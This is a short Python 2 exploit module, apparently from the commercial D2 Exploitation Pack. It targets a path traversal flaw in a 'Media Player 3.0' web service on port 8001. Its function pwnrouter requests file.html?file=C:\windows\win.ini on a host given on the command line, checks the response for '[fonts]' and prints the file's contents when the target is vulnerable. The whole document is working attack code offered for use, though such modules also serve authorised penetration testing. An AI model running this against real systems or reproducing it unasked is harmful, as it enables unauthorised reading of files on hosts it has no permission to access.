#! /usr/bin/env python2
 
#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2020
#

###
# STD modules
###
import os, sys, re
import requests

_name_   = 'd2sec_request_1'
_vendor_ = 'request'
_model_  = ['Media Player 3.0']
_vuln_   = 'Path Traversal Vulnerability'
_cve_    = ''
_ref_    = 'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5599.php'
_port_   = 8001

def pwnrouter(host,port=_port_):
  try:
    url = 'http://%s:%d/file.html?file=C:\windows\win.ini' % (host,port)        
    response = requests.get(url)    
  except Exception, e:
    print '[-] error : %s' % e
    return
  if response is None:
    print '[+] %s not vulnerable' % host
  if '[fonts]' in response.text:
    print '[+] %s vulnerable\n' % host
    print '===\n\n%s'%response.text
  else:            
    print '[+] %s not vulnerable' % host
    

if __name__ == "__main__":
  pwnrouter(sys.argv[1], int(sys.argv[2]))
